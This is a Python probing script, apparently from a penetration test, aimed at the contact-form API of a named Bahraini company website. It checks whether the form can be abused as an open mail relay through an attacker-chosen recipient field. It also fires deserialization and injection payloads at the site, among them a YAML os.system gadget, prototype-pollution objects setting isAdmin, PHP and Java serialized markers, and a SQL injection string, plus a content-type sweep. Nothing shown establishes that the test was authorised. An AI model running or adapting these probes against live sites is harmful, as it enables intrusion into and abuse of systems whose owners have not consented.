import sys, time, json, requests
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + "126" + ".0.0.0 Safari/537.36"
B = "https://www" + "." + "infinitycapital" + "." + "bh"
S = requests.Session()
S.headers.update({"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"})

def go(path, method="GET", data=None, hdrs=None, pace=20):
    time.sleep(pace)
    try:
        return S.request(method, B + path, data=data, headers=hdrs, timeout=35, allow_redirects=False)
    except Exception as e:
        return e

def rpt(tag, r, body=300):
    if isinstance(r, Exception):
        print("[%s] EXC %r" % (tag, r)); return None
    keep = {k: v for k, v in r.headers.items()
            if k.lower() in ("x-vercel-mitigated", "content-type", "location",
                             "x-matched-path", "set-cookie", "cache-control")}
    print("[%s] %s len=%d %s" % (tag, r.status_code, len(r.content), json.dumps(keep)))
    print("   %r" % (r.content[:body],))
    return r

def form(fields):
    """exact client contract from JS: fname,lname,areacode,tel,cname,subject,msg,check,targets"""
    f = {"fname": "vapt", "lname": "probe", "areacode": "+973", "tel": "3600000",
         "cname": "vapt-probe", "subject": "vapt-marker-d13", "msg": "vapt-marker-d13",
         "check": "vapt-marker-d13", "targets": "0"}
    f.update(fields)
    return f

if __name__ == "__main__":
    t = sys.argv[1]

    if t == "baseline":
        # 1. correct well-formed submission -> is the endpoint even alive?
        rpt("send_baseline", go("/api/send", "POST", form({}),
                                {"Referer": B + "/contact"}, pace=20))

    if t == "targets_abuse":
        # 2. attacker-controlled recipient (the claimed open-relay). marker only.
        rpt("targets_attacker", go("/api/send", "POST",
             form({"targets": "probe@invalid.example"}),
             {"Referer": B + "/contact"}, pace=20))

    if t == "deser_probe":
        # 3. does the server deserialize anything? node/php gadget markers
        payloads = {
          "node_json_in_msg": {"msg": '{"rce":"child_process","__proto__":{"x":1}}'},
          "php_serialize":     {"msg": 'O:8:"stdClass":1:{s:4:"test";s:2:"hi";}'},
          "java_magic":        {"msg": "rO0ABXNyABdqYXZh"},
          "yaml_tag":          {"msg": "!!python/object/apply:os.system ['id']"},
          "yaml_js":           {"msg": "!!js/undefined"},
          "json_multi":        {"msg": '{"a":1,"b":{"c":[1,2,{"d":1}]}}'},
          "proto_pollution":   {"msg": '{"__proto__":{"isAdmin":true,"polluted":1}}',
                                "cname": '{"constructor":{"prototype":{"isAdmin":true}}}'},
          "targets_json":      {"targets": '["a@invalid.example","b@invalid.example"]'},
          "targets_nested":    {"targets": '{"0":"x@invalid.example"}'},
          "targets_sql":       {"targets": "1' OR '1'='1"},
          "targets_proto":     {"targets": '{"__proto__":{"x":1}}'},
        }
        for k, v in payloads.items():
            rpt(k, go("/api/send", "POST", form(v), {"Referer": B + "/contact"}, pace=20), body=160)

    if t == "contenttypes":
        # 4. does content-type matter (i.e. is there a body deserializer keyed on it)?
        body = json.dumps({"fname": "a", "targets": "probe@invalid.example"})
        for ct in ["application/json", "application/xml", "text/xml",
                   "application/x-java-serialized-object", "application/x-yaml",
                   "text/plain", "application/x-www-form-urlencoded"]:
            rpt("ct_" + ct.split("/")[-1],
                go("/api/send", "POST", body, {"Content-Type": ct, "Referer": B + "/contact"}, pace=20), body=160)